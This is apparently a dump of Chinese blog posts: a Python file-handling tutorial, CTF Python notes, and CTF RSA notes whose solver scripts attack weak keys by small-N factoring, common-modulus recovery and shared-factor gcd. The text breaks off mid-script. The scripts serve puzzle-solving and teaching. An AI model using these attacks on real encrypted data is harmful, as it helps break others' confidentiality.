Path(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;)for entry in entries.iterdir(): print(entry.name) pathlib.Path() 返回的是 PosixPath 或 WindowsPath 对象，这取决于操作系统。 pathlib.Path() 对象有一个 .iterdir() 的方法用于创建一个迭代器包含该目录下所有文件和目录。由 .iterdir() 生成的每个条目都包含文件或目录的信息，例如其名称和文件属性。pathlib 在Python3.4时被第一次引入，并且是对Python一个很好的加强，它为文件系统提供了面向对象的接口。 在上面的例子中，你调用 pathlib.Path() 并传入了一个路径参数。然后调用 .iterdir() 来获取 my_directory 下的所有文件和目录列表。 总结 函数 描述 os.listdir() 以列表的方式返回目录中所有的文件和文件夹 os.scandir() 返回一个迭代器包含目录中所有的对象，对象包含文件属性信息 pathlib.Path().iterdir() 返回一个迭代器包含目录中所有的对象，对象包含文件属性信息 获取目录中的文件打印出目录中文件的名称。为了过滤目录并仅列出 os.listdir() 生成的目录列表的文件，要使用 os.path ： 1234567import osbasepath &#x3D; &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;for entry in os.listdir(basepath): # 使用os.path.isfile判断该路径是否是文件类型 if os.path.isfile(os.path.join(basepath, entry)): print(entry) 123456789101112131415➜ ~ python3 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.py.DS_Store阅读笔记.md.localizedhuazhu.com.csvhuazhu_url.txt未命名 2.txtPHP木马.mdjava基础.md1.pySQL server.mdsqlmap使用以及学习.mdSQL注入漏洞挖掘.mdIPC.mdPython爬虫.md 在这里调用 os.listdir() 返回指定路径中所有内容的列表，接着使用 os.path.isfile() 过滤列表让其只显示文件类型而非目录类型。 一个更简单的方式来列出一个目录中所有的文件是使用 os.scandir() 或 pathlib.Path() : 1234567import osbasepath &#x3D; &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;with os.scandir(basepath) as entries: for entry in entries: if entry.is_file(): print(entry.name) pathlib.Path() 列出一个目录中的文件： 123456from pathlib import Pathbasepath &#x3D; Path(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;)for entry in basepath.iterdir(): if entry.is_file(): print(entry.name) 列出子目录os.listdir() 和 os.path() : 123456import osbasepath &#x3D; &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;for entry in os.listdir(basepath): if os.path.isdir(os.path.join(basepath, entry)): print(entry) os.scandir() ： is_dir() 返回 True，否侧返回False 1234567import osbasepath &#x3D; &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;with os.scandir(basepath) as entries: for entry in entries: if entry.is_dir(): print(entry.name) pathlib.Path() ： 123456from pathlib import Pathbasepath &#x3D; Path(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;)for entry in basepath.iterdir(): if entry.is_dir(): print(entry.name) 在 .iterdir() 迭代器返回的每一项上调用 is_dir() 检查是文件还是目录。 获取文件属性os.scandir() 和 pathlib.Path() 能直接获取到包含文件属性的目录列表。 1234567891011121314import oswith os.scandir(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;) as entries: for entry in entries: info &#x3D; entry.stat() print(info.st_mtime) &quot;&quot;&quot;1548163662.39526651548163689.19820621548163697.91759041548163721.18410281548163740.7651621548163769.4702623&quot;&quot;&quot; os.scandir() 返回一个 ScandirIterator 对象。ScandirIterator 对象中的每一项有 .stat() 方法能获取关于它指向文件或目录的信息。 .stat() 提供了例如文件大小和最后修改时间的信息。 创建目录 方法 描述 os.mkdir() 创建单个子目录 os.makedirs() 创建多个目录，包括中间目录 Pathlib.Path.mkdir() 创建单个或多个目录 创建单个目录要创建单个目录，把目录路径作为参数传给 os.mkdir() : 123import osos.mkdir(&#x27;/steady/1.php&#x27;) 如果该目录已经存在，os.mkdir() 将抛出 FileExistsError 异常。或者，你也可以使用 pathlib 来创建目录: 1234from pathlib import Pathp = Path(&#x27;example_directory&#x27;)p.mkdir() 如果路径已经存在，mkdir() 会抛出 FileExistsError 异常: 1FileExistsError: [Errno 17] File exists: &#39;example_directory&#39; 为了避免像这样的错误抛出， 当发生错误时捕获错误并让你的用户知道: 1234567from pathlib import Pathp = Path(&#x27;example_directory&#x27;)try: p.mkdir()except FileExistsError as e: print(e) 创建多个目录os.makedirs() 和 os.mkdir() 类似。两者之间的区别在于，os.makedirs() 不仅可以创建单独的目录，还可以递归的创建目录树。 123import osos.makedirs(&#x27;2018/10/05&#x27;, mode=0o770) 上述代码创建了 2018/10/05 的目录结构并为所有者和组用户提供读、写和执行权限。默认的模式为 0o777 ，增加了其他用户组的权限。 遍历目录和处理文件Python函数 os.walk() 来实现这一功能。os.walk() 用于通过从上到下或从下到上遍历树来生成目录树中的文件名。 os.walk() 默认是从上到下遍历目录: 12345import osfor dirpath, dirname, files in os.walk(&#x27;目录位置&#x27;): print(f&#x27;Found directory: &#123;dirpath&#125;&#x27;) for file_name in files: print(file_name) os.walk() 在每个循环中返回三个值： 当前文件夹的名称 当前文件夹中子文件夹的列表 当前文件夹中文件的列表 在每次迭代中，会打印出它找到的子目录和文件的名称： 1234567891011121314Found directory: /Users/apple/Desktop/steady-learn/笔记/漏洞原理/SQL/Mysql注入学习/sql注入题.DS_StoreSQL注入--8.mdSQL注入--3.mdSQL注入--6.mdSQL注入--2.mdSQL注入--5.mdSQL注入--1.mdSQL注入--4.mdFound directory: /Users/apple/Desktop/steady-learn/笔记/漏洞原理/SQL/Mysql注入学习/sql注入SQL注入--过滤空格.mdSQL注入--过滤and、or.md.DS_StoreSQL注入--字符型和数字型注入的判断.md 复制文件shutil.copy()使用shutil.copy() 将文件从一个位置复制到另一个位置 12345import shutilsrc &#x3D; &#39;path&#x2F;to&#x2F;file.txt&#39;dst &#x3D; &#39;path&#x2F;to&#x2F;dest_dir&#39;shutil.copy(src, dst) shutil.copy(src，dst) 会将文件 src 复制到 dst 中指定的位置。 如果 dst 是文件，则该文件的内容将替换为 src 的内容。 如果 dst 是目录，则 src 将被复制到该目录中。 shutil.copy() 仅复制文件的内容和文件的权限。 其他元数据（如文件的创建和修改时间）不会保留。 shutil.copy2()复制时保留所有文件元数据 移动文件和目录要将文件或目录移动到其他位置，请使用 shutil.move(src，dst) 。 123import shutildst &#x3D; shutil.move(&#39;dir_1&#x2F;&#39;, &#39;backup&#x2F;&#39;)print(dst) # &#39;backup&#39; 如果 backup/ 存在，则 shutil.move(&#39;dir_1/&#39;，&#39;backup/&#39;) 将 dir_1/ 移动到 backup/ 。 如果 backup/ 不存在，则 dir_1/ 将重命名为 backup 。 重命名文件和目录Python包含用于重命名文件和目录的 os.rename(src，dst)： 12import osos.rename(&#39;first.zip&#39;, &#39;first_01.zip&#39;) 上面的行将 first.zip 重命名为 first_01.zip 。 如果目标路径指向目录，则会抛出 OSError 。 读取ZIP文件zipfile 模块是一个底层模块，是Python标准库的一部分。 zipfile 具有可以轻松打开和提取ZIP文件的函数。 要读取ZIP文件的内容，首先要做的是创建一个 ZipFile 对象。ZipFile 对象类似于使用 open() 创建的文件对象。ZipFile 也是一个上下文管理器，因此支持with语句： 打开ZIP文件后，可以通过 zipfile 模块提供的函数访问有关存档文件的信息。 要获取存档文件中的文件列表，请在 ZipFile 对象上调用 namelist() ： 123456import zipfilewith zipfile.ZipFile(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;makedown.zip&#39;, &#39;r&#39;) as fp: a&#x3D;fp.namelist() for i in a: print(i) .namelist() 返回存档文件中文件和目录的名称列表。要检索有关存档文件中文件的信息，使用 .getinfo() ： 12345import zipfilewith zipfile.ZipFile(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;makedown.zip&#39;, &#39;r&#39;) as zipobj: bar_info &#x3D; zipobj.getinfo(&#39;makedown&#x2F;8B77F3C7-DC39-48C0-99C5-4CC7B1C123AC.png&#39;) print(bar_info.file_size) .getinfo() 返回一个 ZipInfo 对象，该对象存储有关存档文件的单个成员的信息。 要获取有关存档文件中文件的信息，请将其路径作为参数传递给 .getinfo() 。 使用 getinfo() ，你可以检索有关存档文件成员的信息，例如上次修改文件的日期，压缩大小及其完整文件名。 访问 .file_size 将以字节为单位检索文件的原始大小。 提取ZIP文件zipfile 模块允许你通过 .extract() 和 .extractall() 从ZIP文件中提取一个或多个文件。 默认情况下，这些方法将文件提取到当前目录。 它们都采用可选的路径参数，允许指定要将文件提取到的其他指定目录。 如果该目录不存在，则会自动创建该目录。 要从压缩文件中提取文件，请执行以下操作： 提取所有文件 1234import zipfileimport osdata_zip &#x3D; zipfile.ZipFile(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;makedown.zip&#39;, &#39;r&#39;)data_zip.extractall(path&#x3D;&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1&#39;) 提取某一个文件到当前目录下 1data_zip.extract(&#39;file1.py&#39;) 从加密的文档提取数据zipfile 支持提取受密码保护的ZIP。 要提取受密码保护的ZIP文件，请将密码作为参数传递给 .extract() 或.extractall() 方法： 12345&gt;&gt;&gt; import zipfile&gt;&gt;&gt; with zipfile.ZipFile(&#39;secret.zip&#39;, &#39;r&#39;) as pwd_zip:... # 从加密的文档提取数据... pwd_zip.extractall(path&#x3D;&#39;extract_dir&#39;, pwd&#x3D;&#39;Quish3@o&#39;) 将以读取模式打开 secret.zip 存档。 密码提供给 .extractall() ，并且压缩文件内容被提取到 extract_dir 。 由于with语句，在完成提取后，存档文件会自动关闭。","categories":[{"name":"Python学习","slug":"Python学习","permalink":"http://s1eady.top/categories/Python%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://s1eady.top/tags/Python/"}]},{"title":"CTF-python","slug":"CTF-Python","date":"2018-11-29T18:13:29.000Z","updated":"2020-11-06T11:23:48.016Z","comments":true,"path":"2018/11/30/CTF-Python/","link":"","permalink":"http://s1eady.top/2018/11/30/CTF-Python/","excerpt":"","text":"CTF中的Pythonstr 与 bytes 之间的类型转换str 与 bytes 之间的类型转换如下： str ⇒ bytes：bytes(s, encoding=&#39;utf8&#39;) bytes ⇒ str：str(b, encoding=&#39;utf-8&#39;) str.encode(s) bytes.decode(b) 12345678910111213141516171819# bytes object b = b&quot;example&quot; # str object s = &quot;example&quot; # str to bytes bytes(s, encoding = &quot;utf8&quot;) # bytes to str str(b, encoding = &quot;utf-8&quot;) # an alternative method # str to bytes str.encode(s) # bytes to str 进制转换1234二进制转换到十进制 int（&#x27;a&#x27;，2)八进制转换十六进制 hex(&#x27;a&#x27;)十进制转换二进制 bin(&#x27;a&#x27;)十六进制转换八进制 oct(&#x27;a&#x27;) int函数12345678a&#x3D;&quot;0x65&quot;print(int(a,16))b&#x3D;&quot;0o157&quot;print(int(b,8))c&#x3D;&quot;0o157&quot;print(int(c,8))d&#x3D;&quot;87&quot;print(int(d)) 十六进制与字符串转化123import binasciisteady_str=&quot;flag&#123;Have_y0U_Py_script_Otc_To_Ten_Ascii!&#125;&quot;print(binascii.hexlify(steady_str)) 12import binasciiprint(binascii.unhexlify(&quot;666c61677b486176655f7930555f50795f7363726970745f4f74635f546f5f54656e5f4173636969217d&quot;)) 1)hex()会进行进制转换，转换结果会带有0x。而且hex只会处理数字，不能处理字符串。2)unhexlify()会将十六进制解码，不仅会处理数字，还会处理字符串。 二进制转换成字符串123456789g=&#x27;0110110101111001011011100110000101101101011001010110100101110011011010110110010101111001001000010010000100100001011010000110100001101000&#x27;b=&#x27;&#x27;e=0for i in range(len(g)): e+=1print(e)for i in range(0,136,8): b+=chr(int(g[i:i+8],2))print(b) 二进制八个一组转化为十进制，转换为ascii。 八进制转化转换字符串1234567a=&#x27;146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175&#x27;flag=&quot;&quot;l=len(a)print(a)for i in range(0,l,3): flag+=chr(int(a[i:i+3],8))print (flag) 三个一组转换成十进制，然后转化为字符串。 二进制转十六进制二进制先转成十进制，再转成 十六进制。 1hex(int(&#39;101010&#39;,2)) 常用小tripstartswith()函数：startswith() 作用：判断字符串是否以指定字符或子字符串开头。 语法：string.startswith(str, beg=0,end=len(string)) 返回值：如果检测到字符串，则返回True，否则返回False。默认空字符为True。 12345678910111213141516&gt;&gt;&gt; s = &#x27;hello good boy steady&#x27;&gt;&gt;&gt; print s.startswith(&#x27;h&#x27;)True&gt;&gt;&gt; print s.startswith(&#x27;hel&#x27;)True&gt;&gt;&gt; print s.startswith(&#x27;h&#x27;,4)False&gt;&gt;&gt; print s.startswith(&#x27;go&#x27;,6,8)True #匹配空字符集&gt;&gt;&gt; print s.startswith(&#x27;&#x27;)True#匹配元组&gt;&gt;&gt; print s.startswith((&#x27;t&#x27;,&#x27;b&#x27;,&#x27;h&#x27;))True 大小写转化1234steady_dic=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;steady_dic1=&quot;abcdefghijklmnopqrstuvwxyz&quot;print(steady_dic.lower())print(steady_dic1.upper()) 大小写字母123456789import stringwords1 = list(string.ascii_uppercase)print(words1)words2 = list(string.ascii_lowercase)print(words2)words3 = list(string.ascii_letters)print(words3) 正则表达式去除空格 1steady_str&#x3D;re.sub(r&quot; &quot;,&quot;&quot;,steady_str) 提取某些字符串 1steady_str&#x3D;re.findall(r&#39;&lt;(.*?)&lt;&#39;,steady_str) enumerate123iv&#x3D;[2,3,7,5,13,12,9,1,8,10,4,11,6]for x,y in enumerate(iv): print(x,y) 123456789101112130 21 32 73 54 135 126 97 18 89 1010 411 1112 6 Python列表list使用list将字符串转化为列表 123steay_str&#x3D;&quot;steady&quot;print(list(steay_str))[&#39;s&#39;, &#39;t&#39;, &#39;e&#39;, &#39;a&#39;, &#39;d&#39;, &#39;y&#39;] 结合range()函数 12print(list(range(3)))[0, 1, 2] 列表切片切片使用2个冒号分隔的3个数字来完成： 第一个数字表示切片的开始位置，默认为0 第二个数字表是切片的截止（但不包含）位置（默认为列表长度） 第三个数字表示切片的步长(默认为1)，当步长省略时，顺便可以省略最后一个冒号 123li &#x3D; [1, 4, 5, 6, 7, 9, 11, 14, 16]li[::-1] &#x3D;&#x3D; [16,14,11,9,7,6,5,4,1] # 翻转整个列表li[::-2] &#x3D;&#x3D; [16,11,7,5,1] # 翻转整个列表，再按2间隔过滤 123456789List&#x3D;[3,4,5,6,7,9,11,13,15,17]print(List[::]) #[3, 4, 5, 6, 7, 9, 11, 13, 15, 17]print(List[::-1]) #[17, 15, 13, 11, 9, 7, 6, 5, 4, 3]#加了负号，就是一个逆向输出print(List[::2]) # [3, 5, 7, 11, 15]#以步长为2进行输出，输出下标依次为0 2 4 6print(List[1::2]) #[4, 6, 9, 13, 17],从一开始步长为2print(List[3::]) #[6, 7, 9, 11, 13, 15, 17]print(List[3:6]) #省略的是步长，而且不包括下标为6的元素 #[6, 7, 9] 其他函数 用len()方法，统计全部元素的个数。 用count()方法，统计指定值的元素的个数。 用max()方法，统计元素中的最大值（要求元素类型相同；数字类型直接比较，其它类型比较id） 用min()方法，统计元素中的最小值（要求元素类型相同；数字类型直接比较，其它类型比较id） 用index()方法，查找指定值的元素的索引位置（第一个匹配项）。 用reverse()方法，翻转列表中的元素。 用copy()方法，浅拷贝并生成新的列表。 用deepcopy()方法，深拷贝并生成新的列表。 用sort()方法，在原列表基础上进行排序。 用sorted()方法，将新列表基础上对原列表的元素进行排序。 itertoolsPython的内建模块itertools提供了非常有用的用于操作迭代对象的函数。 “无限”迭代器1234import itertoolsnatuals = itertools.count(1)for n in natuals: print(n) count()会创建一个无限的迭代器，所以上述代码会打印出自然数序列，根本停不下来，只能按Ctrl+C退出。 repeat()负责把一个元素无限重复下去，不过如果提供第二个参数就可以限定重复次数： 1234import itertoolsns &#x3D; itertools.repeat(&#39;A&#39;, 3)for n in ns: print(n) 输出 1234PS C:\\Users\\12521&gt; &amp; F:&#x2F;web_envioment&#x2F;python3&#x2F;python3.exe c:&#x2F;Users&#x2F;12521&#x2F;Desktop&#x2F;2.pyAAA","categories":[{"name":"CTF-python","slug":"CTF-python","permalink":"http://s1eady.top/categories/CTF-python/"}],"tags":[{"name":"CTF-python","slug":"CTF-python","permalink":"http://s1eady.top/tags/CTF-python/"}]},{"title":"CTF-RSA","slug":"CTF-RSA","date":"2018-11-07T19:28:56.000Z","updated":"2020-11-06T11:52:19.155Z","comments":true,"path":"2018/11/08/CTF-RSA/","link":"","permalink":"http://s1eady.top/2018/11/08/CTF-RSA/","excerpt":"","text":"CTF-RSA基础什么是”素数”不能表示为其它任何两个整数的乘积(除了1或者本身)，比如13只能是13*1=13，3*5=15，15就不是质数。 什么是”互质数”公约数只有1的两个数，叫做互质数。 模运算110 mod 3&#x3D;1；26 mod 6&#x3D;2；28 mod 2 &#x3D;0 欧拉函数什么是欧拉函数欧拉函数是小于x的整数中与x互素的数的个数，一般用φ(x)表示。特殊的，φ(1)=1。 如何计算欧拉函数通式：φ(n)=n*(1-1/p1)*(1-1/p2)*(1-1/p3)*(1-1/p4)*…*(1-1/pn),其中p1, p2……pn为n的所有素因数，n是不为0的整数。 欧拉定理欧拉定理是指：如果两个正整数a和n互素，则n的欧拉函数φ(n)可以让下面的式子成立： 即a的φ(n)次方减去1，可以被n整除. 比如，3和4互质，φ(4)=2，(3^2-1)/4=2. 当a为正整数，n为素数且a不能被n整除时，则有a^(n-1) ≡ 1 (mod n)这就是费马小定理. RSA加密算法密钥的生成过程12341. 随意选择两个大的素数p和q，p不等于q，计算n &#x3D; pq.2. 根据欧拉函数的性质3，求得r&#x3D;φ(n)&#x3D;φ(p)φ(q)&#x3D;(p-1)(q-1).3. 选择一个小于r的整数e,且e与r互素；并求得e关于r的模反元素，命名为d.(模反元素存在，当且仅当e与r互质; 求d令ed≡1(mod r)）4. 将p和q的记录销毁 (n，e)是公钥，(n，d)是私钥. 例如： 1234561. A随机选两个不相等的质数61和53，并计算两数的积n&#x3D;61*53&#x3D;3233，n的长度就是密钥长度。3233的二进制是110010100001，一共12位， 所以这个密钥就是12位. 实际应用中，RSA密钥一般是1024位，重要的场合是2048位.2. 计算n的欧拉函数; φ(n)&#x3D;(p-1)(q-1)&#x3D;60*52&#x3D;3120.3. A在1到3120上随机选择了一个随机数e&#x3D;17，与3120互素.4. 计算e对φ(n)的模反元素d，即时，ed-1&#x3D;kφ(n)。 即使求解：17x+3120y&#x3D;1.用扩展欧几里得算法求解。可以算出一组解(x,y)&#x3D;(2753,-15)，即d&#x3D;2753. 公钥(3233, 17)，私钥(3233,2753) 加解密过程明文：m 密文：c 两个数：p、qn：q×pf(n)：(p-1)×(q-1)e：与f(n)互为质数d：e×d=1 mod f(n) 加密公钥加密—-(n,e)—-(33,3) 1c&#x3D;m^e%N 解密1m&#x3D;c^d%N 总结12345选择两个大素数p和q，计算出模数N &#x3D; p * q计算φ &#x3D; (p−1) * (q−1) 即N的欧拉函数，然后选择一个e (1&lt;e&lt;φ)，且e和φ互质取e的模反数为d，计算方法: e * d ≡ 1 (mod φ)对明文m进行加密：c &#x3D; pow(m, e, N)，得到的c即为密文对密文c进行解密，m &#x3D; pow(c, d, N)，得到的m即为明文 Python与RSA求p、q 123N&#x3D;30064958471180141352963255964320727764941087854957385562672821662319854021395100968823341108075020928542437446993994119863902565874355296188498304761389336438421889636409561936141985786801002923752627293790265351723795968412774268086467114263767947693310444934316205390814185802517514694528501333851255084653925181726978734804806707740444755908398751964899143494522781405457103697373868972836201511424363601490903086488506985489526910314474245106338585623571369549388434865567951986866445306840505397268281889886738015891982162371413136885989746931929787765617838750381226036784122498143172854419447324975505933540511q&#x3D;57970027print(N&#x2F;&#x2F;q) 分解N 1234N &#x3D; 98554799767for i in range(2, N): if N % i &#x3D;&#x3D; 0: print (i) 1234567python2from factordb.factordb import FactorDBN=322831561921859factor=FactorDB(N)factor.connect()factor_list=factor.get_factor_list()print(factor_list) 求解D 1D &#x3D; gmpy2.invert(e,n) # 求逆元，de &#x3D; 1 mod n 返回的D的类型为&lt;class ‘mpz’&gt; 欧几里得算法求D 1D&#x3D;gmpy2.gcd(a,b) 求明文 1m&#x3D;pow(int(c),d,n) 其中d的类型是&lt;class ‘mpz’&gt; 初始化一个大整数x 1gmpy2.mpz(x) libnum库 libnum.s2n(s)：字符串转换为数字 12345import libnums &#x3D; &quot;ab12&quot;print(libnum.s2n(s))result: 1633825074 libnum.s2n(n)：数字转换为字符串 12345import libnumn &#x3D; 1633825074print(libnum.n2s(n))result: ab12 libnum.s2b(s)：字符串转换为二进制字符串 12345import libnums &#x3D; &quot;ab12&quot;print(libnum.s2b(s))result: 01100001011000100011000100110010 libnum.b2s(b)：二进制字符串转换为字符串 12345import libnumb &#x3D; &quot;01100001011000100011000100110010&quot;print(libnum.b2s(b))result: ab12 求d 1234567import gmpy2 p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 phi = (p-1)*(q-1) d = gmpy2.invert(e,phi) print d 1234567import libnum p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 phi = (p-1)*(q-1) d = libnum.invmod(e,phi) print d CTF-中的RSA总体思路就是获取秘文然后根据给的条件解密。 爆破因子模数N过小时，我们可以写个脚本直接爆破他的因子 1234N &#x3D; 920139713for i in range(2, N): if N % i &#x3D;&#x3D; 0: print (i) 12345678910111213import gmpy2flag=&quot;&quot;e=19q=18443p=49891n=920139713phin = (p - 1) * (q - 1)d=gmpy2.invert(e, phin)f=open(&#x27;/Users/apple/Desktop/1.txt&#x27;,&#x27;r&#x27;)for i in f.readlines(): m=pow(int(i),d,n) flag+=chr(m)print(flag) 求N、P、Q前提： 题目给出了p+q,(p+1)(q+1),e,d,c。 12345678910(p+1)(q+1)=p*q+p+q+1=n+(p+q)+1=xn=x-(p+q+1)y=(q+p+1)n=x-yphi=(p-1)(q-1) =p*q-p-q+1 =p*q-(p+q)+1 =n-y+2d = gmpy2.invert(e,phi)m = pow(c,d,n) 1234567891011import gmpy2 from Crypto.Util.number import long_to_bytes x = 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea + 1 y = 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740 c = 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a e = 0xe6b1bee47bd63f615c7d0a43c529d219 n = y-x phi = n-x+2 d =gmpy2.invert(e,phi) m = pow(c,d,n) print long_to_bytes(m) 直接求d12345678910import gmpy2flag=&quot;&quot;p = 473398607161q = 4511491e = 17c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034n=q*pphin = (p - 1) * (q - 1)d=gmpy2.invert(e, phin)print(d) 常规脚本1234567891011import gmpy2flag=&quot;&quot;p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034n=q*pphin = (p - 1) * (q - 1)d=gmpy2.invert(e, phin)m=pow(int(c),d,n)print(m) 公共模数攻击前提： 共模、知道公钥、未知D、gcd(e1,e2)==1,通常已经知道c1、c2、e1、e2、n1。 判断gcd(e1,e2)==1 123456789def gcd(a,b): if a%b == 0: return b else : return gcd(b,a%b)e1=11187289e2=9647291if gcd(e1,e2)==1: print(9) 12345678910111213141516from gmpy2 import *import libnumn = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929e1 = 17e2 = 65537s = gcdext(e1, e2)s1 = s[1]s2 = -s[2]c1 = libnum.s2n(open(&quot;./veryhardRSA/flag.enc1&quot;, &#x27;rb&#x27;).read())c2 = libnum.s2n(open(&quot;./veryhardRSA/flag.enc2&quot;, &#x27;rb&#x27;).read())c2 = invert(c2, n)m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % nprint libnum.n2s(m) 12345678910111213141516from gmpy2 import *import libnumn = 15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571e1 = 797e2 = 521s = gcdext(e1, e2)s1 = s[1]s2 = -s[2]c1 = 11157593264920825445770016357141996124368529899750745256684450189070288181107423044846165593218013465053839661401595417236657920874113839974471883493099846397002721270590059414981101686668721548330630468951353910564696445509556956955232059386625725883038103399028010566732074011325543650672982884236951904410141077728929261477083689095161596979213961494716637502980358298944316636829309169794324394742285175377601826473276006795072518510850734941703194417926566446980262512429590253643561098275852970461913026108090608491507300365391639081555316166526932233787566053827355349022396563769697278239577184503627244170930c2 = 6699274351853330023117840396450375948797682409595670560999898826038378040157859939888021861338431350172193961054314487476965030228381372659733197551597730394275360811462401853988404006922710039053586471244376282019487691307865741621991977539073601368892834227191286663809236586729196876277005838495318639365575638989137572792843310915220039476722684554553337116930323671829220528562573169295901496437858327730504992799753724465760161805820723578087668737581704682158991028502143744445435775458296907671407184921683317371216729214056381292474141668027801600327187443375858394577015394108813273774641427184411887546849c2 = invert(c2, n)m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % nprint libnum.n2s(m) 共同公约数前提： 如果在两次公钥的加密过程中使用的n1和n2具有相同的素因子，那么可以利用欧几里得算法直接将p和q分解。 123456789import gmpy2n1=9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327n2=13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743flag=gmpy2.gcd(n1,n2)print(flag) 十六进制与十进制转换十进制 1234567891011121314import gmpy2import binasciiimport mathflag=&quot;&quot;n=30064958471180141352963255964320727764941087854957385562672821662319854021395100968823341108075020928542437446993994119863902565874355296188498304761389336438421889636409561936141985786801002923752627293790265351723795968412774268086467114263767947693310444934316205390814185802517514694528501333851255084653925181726978734804806707740444755908398751964899143494522781405457103697373868972836201511424363601490903086488506985489526910314474245106338585623571369549388434865567951986866445306840505397268281889886738015891982162371413136885989746931929787765617838750381226036784122498143172854419447324975505933540511p=518629368090170828331048663550229634444384299751272939077168648935075604180676006392464524953128293842996441022771890719731811852948684950388211907532651941639114462313594608747413310447500790775078081191686616804987790818396104388332734677935684723647108960882771460341293023764117182393730838418468480006985768382115446225422781116531906323045161803441960506496275763429558238732127362521949515590606221409745127192859630468854653290302491063292735496286233738504010613373838035073995140744724948933839238851600638652315655508861728439180988253324943039367876070687033249730660337593825389358874152757864093q=57970027e=65537c=7794723418575865133221710844957533763600341922604517613342495747603012554180094280541823023634873599126585279853308940496678282266476710442981516354722804125430496779901585048718048185233664790252394684332465074382441230073678600882729934579182285214951880877250418707254283530428901115269852700826395665491878667661628136001999399484533201783253765516767750014674954245926135408324886326143714299876277011335423927566142213389260930015587242338816401180184690143281167398845157288962617745058933037815909282349958256327539704772842249498887000705177364153517572284141825022022854893024073953342334031407154501829377phin = (p - 1) * (q - 1)d=gmpy2.invert(e, 